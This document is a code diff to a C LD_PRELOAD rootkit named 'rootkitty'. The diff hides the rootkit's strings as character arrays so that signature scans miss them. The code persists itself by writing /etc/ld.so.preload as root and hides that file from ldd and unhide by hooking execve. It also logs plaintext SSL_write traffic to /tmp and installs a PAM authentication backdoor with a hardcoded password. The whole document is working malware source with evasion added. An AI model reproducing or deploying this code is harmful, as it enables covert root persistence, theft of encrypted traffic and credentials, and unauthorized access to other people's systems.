@@ -42,14 +42,15 @@ __attribute__((constructor)) void PersistCheck(void) {
   Dl_info path;
   char line[255];
   char check[PATH_MAX]; // Make sure this is enough to store the path
+  char preload[] = { '/', 'e', 't', 'c', '/', 'l', 'd', '.', 's', 'o', '.', 'p', 'r', 'e', 'l', 'o', 'a', 'd', 0 };
 
   dladdr((void*)PersistCheck, &path);
   uid_t old_uid = getuid();
   seteuid(0);
   
-  if (access("/etc/ld.so.preload", F_OK) == 0){
+  if (access(preload, F_OK) == 0){
     // file exists, check if we are already written to the file
-    fd = fopen("/etc/ld.so.preload", "r");
+    fd = fopen(preload, "r");
     if(fd == NULL) return;
     
     if (fgets(check, sizeof(check), fd) && strcmp(check, path.dli_fname) == 0){
@@ -72,10 +73,10 @@ __attribute__((constructor)) void PersistCheck(void) {
 
     fclose(fd);
     fclose(temp_fd);
-    rename("/tmp/rootkitty_tmp.txt", "/etc/ld.so.preload");
+    rename("/tmp/rootkitty_tmp.txt", preload);
   } else {
     // file doesn't exist, try to create it
-    fd = fopen("/etc/ld.so.preload", "w");
+    fd = fopen(preload, "w");
     if (fd != NULL) {
       fprintf(fd, "%s\n", path.dli_fname); // append the new line for consistency
       fclose(fd); // Close file pointer if successfully opened
@@ -85,12 +86,17 @@ __attribute__((constructor)) void PersistCheck(void) {
 }
 /*---------[ HOOK EXECVE TO HIDE THE LD.SO.PRELOAD FILE ]---------*/
 int execve(const char *pathname, char *const argv[], char *const envp[]) {
-  if (strcmp(pathname,"/bin/ldd")==0 || strcmp(pathname,"/bin/unhide")==0) {
+  char ldd[] = { '/', 'b', 'i', 'n', '/', 'l', 'd', 'd', 0 };
+  char unhide[] = { '/', 'b', 'i', 'n', '/', 'u', 'n', 'h', 'i', 'd', 'e', 0 };
+  char normal[] = { '/', 'e', 't', 'c', '/', 'l', 'd', '.', 's', 'o', '.', 'p', 'r', 'e', 'l', 'o', 'a', 'd', 0 };
+  char hidden[] = { '/', 'e', 't', 'c', '/', '.', 'l', 'd', '.', 's', 'o', '.', 'p', 'r', 'e', 'l', 'o', 'a', 'd', 0 };
+
+  if (strcmp(pathname,ldd)==0 || strcmp(pathname,unhide)==0) {
     uid_t old_uid = getuid();
     seteuid(0);
-    rename("/etc/ld.so.preload", "/etc/.ld.so.preload");  // Hide file
+    rename(normal, hidden);  // Hide file
     sleep(2);
-    rename("/etc/.ld.so.preload", "/etc/ld.so.preload"); // Restore file
+    rename(hidden, normal); // Restore file
     seteuid(old_uid); // Drop the privileges back to normal
   }
   return og_execve(pathname, argv, envp);
@@ -121,7 +127,8 @@ struct dirent64* readdir64(DIR* dirp) {
 }
 /*---------[ INTERCEPTING SSL_WRITE ]---------*/ 
 int SSL_write(SSL* ssl, const void *buf, int num) {
-  FILE* fd = fopen("/tmp/SSL_log.txt", "a+");
+  char path[] = {'/', 't', 'm', 'p', '/', 'S', 'S', 'L', '_', 'l', 'o', 'g', '.', 't', 'x', 't', 0 };
+  FILE* fd = fopen(path, "a+");
   if (fd != NULL){
     fprintf(fd, "PID:%d\n", getpid());
     fwrite(buf, 1, num, fd);
@@ -152,8 +159,8 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, cons
   const char* input_passwd;
 
   pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
-
-  if (input_passwd != NULL && strcmp(input_passwd, "root") == 0) { // will be changed later
+  char password[] = { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
+  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
     backdoor = 1;
     return PAM_SUCCESS;
   }
